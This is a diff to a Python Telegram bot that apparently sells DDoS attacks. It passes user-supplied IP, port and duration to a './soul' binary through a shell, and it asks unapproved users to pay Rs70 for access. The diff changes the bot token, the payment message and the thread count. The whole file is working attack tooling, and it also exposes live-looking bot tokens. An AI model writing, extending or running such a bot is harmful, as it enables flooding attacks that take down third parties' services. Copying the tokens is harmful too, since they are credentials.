@@ -2,7 +2,7 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '8160827648:AAGXwLoXtAq-bSxCV0oJmI7xxTtBUxWSQW4'
+TELEGRAM_BOT_TOKEN = '8160827648:AAH-d5t86cU6lKCnBCfBB2reOIAsU1jUjxc'
 ADMIN_USER_ID = 6062735907
 APPROVED_IDS_FILE = 'approved_ids.txt'
 attack_in_progress = False
@@ -79,7 +79,7 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if str(chat_id) not in approved_ids and user_id not in approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ buy karo Rs70 pay kar k🤝.*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
@@ -108,7 +108,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {time} 1200",
+            f"./soul {ip} {port} {time} 1600",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
